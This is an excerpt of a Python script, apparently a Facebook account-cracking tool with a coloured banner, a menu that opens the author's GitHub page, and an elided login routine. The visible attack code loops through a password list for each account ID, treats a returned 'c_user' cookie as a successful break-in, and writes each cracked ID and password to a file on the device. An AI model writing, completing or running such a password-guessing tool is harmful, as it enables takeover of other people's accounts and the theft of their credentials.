...
#os.system("xdg-open https://github.com/NAYAN-404")
logo=("""\033[92;1m
\033[0;92m╔══════════════════════════════════════════════╗
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/NAYAN-404');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m NAYAN \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/NAYAN-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
